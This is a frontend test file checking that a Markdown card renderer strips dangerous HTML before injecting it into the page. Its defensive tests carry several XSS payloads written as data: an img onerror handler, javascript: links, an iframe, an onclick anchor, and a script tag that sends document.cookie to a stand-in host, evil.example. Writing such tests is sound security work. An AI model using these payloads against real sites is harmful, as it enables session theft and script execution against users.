import { describe, expect, it } from 'vitest';
import { render, screen } from '@testing-library/react';
import { RenderedCardContent } from '../src/index';

describe('RenderedCardContent', () => {
  it('renders the Markdown, parsed', () => {
    const { container } = render(
      <RenderedCardContent
        title="Hello"
        markdown={'A paragraph with **bold** text.\n\n- one\n- two'}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Hello' })).toBeInTheDocument();
    // The counterpart to the opened Card's source editor: here the markers are
    // consumed and real elements come out (ADR 0011).
    expect(container.querySelector('strong')?.textContent).toBe('bold');
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });

  /**
   * The HTML goes in through `dangerouslySetInnerHTML`, so what `marked` emits
   * reaches the DOM. `marked` has had no `sanitize` option since v5 and passes
   * inline HTML through verbatim, which made every one of these live.
   *
   * These are asserted on the rendered DOM rather than on a sanitiser call,
   * because the property that matters is "no executable attribute survives into
   * the document", not "a particular function was invoked".
   */
  describe('sanitises the HTML it injects', () => {
    it('strips event-handler attributes', () => {
      const { container } = render(
        <RenderedCardContent title="T" markdown={'<img src=x onerror="alert(document.domain)">'} />,
      );

      const img = container.querySelector('img');
      expect(img).not.toBeNull();
      // The element survives — sanitising is not escaping, and a card that
      // legitimately embeds an image should still show one.
      expect(img?.getAttribute('onerror')).toBeNull();
      expect(container.innerHTML).not.toContain('onerror');
    });

    it('strips javascript: hrefs while keeping the link', () => {
      const { container } = render(
        <RenderedCardContent title="T" markdown="[click](javascript:alert(1))" />,
      );

      // Assert the anchor survives, not just that the scheme is gone: deleting
      // the whole element would satisfy the second check and quietly turn
      // sanitising into censoring.
      const link = container.querySelector('a');
      expect(link).not.toBeNull();
      expect(link?.textContent).toBe('click');
      expect(link?.getAttribute('href')).toBeNull();
      expect(container.innerHTML).not.toContain('javascript:');
    });

    it('drops script and iframe elements entirely', () => {
      const { container } = render(
        <RenderedCardContent
          title="T"
          markdown={
            '<script>fetch("//evil.example/"+document.cookie)</script>\n\n' +
            '<iframe src="javascript:alert(1)"></iframe>'
          }
        />,
      );

      expect(container.querySelector('script')).toBeNull();
      expect(container.querySelector('iframe')).toBeNull();
      expect(container.innerHTML).not.toContain('evil.example');
    });

    it('strips inline handlers on anchors', () => {
      const { container } = render(
        <RenderedCardContent title="T" markdown={'<a href="#" onclick="alert(1)">x</a>'} />,
      );

      expect(container.querySelector('a')?.getAttribute('onclick')).toBeNull();
      expect(container.innerHTML).not.toContain('onclick');
    });
  });
});
